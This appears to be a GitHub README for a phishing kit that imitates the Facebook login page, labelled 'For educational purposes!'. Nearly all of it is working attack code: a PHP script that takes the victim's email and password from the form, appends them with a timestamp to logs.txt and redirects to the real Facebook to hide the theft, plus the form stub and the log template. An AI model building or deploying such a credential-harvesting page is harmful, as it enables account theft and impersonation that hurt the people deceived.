### Facebook 2022 Phishing Page
#### For educational purposes!

### logs.txt
```
Date and Time: (Date and Time)
Username: (Username/Email)
Password: (Password)
```

### index.html (form)
```html
<form action="./index.php" method="get">
```

### index.php
```php
<?php
if (isset($_GET["email"])){
    $username = $_GET["email"];
}
if (isset($_GET["pass"])){
    $password = $_GET["pass"];
}
$date = date("d-m-y h:i:s");

file_put_contents("logs.txt", "Date: " . $date . "\n", FILE_APPEND);
file_put_contents("logs.txt", "Username: " . $username . "\n" , FILE_APPEND);
file_put_contents("logs.txt", "Password: ". $password . "\n\n", FILE_APPEND);
header("Location: https://www.facebook.com/");
?>
```

### Page Screenshot
![image](https://user-images.githubusercontent.com/104715127/177643156-bc7cc152-b50e-4182-abf1-df67a37aa6bf.png)
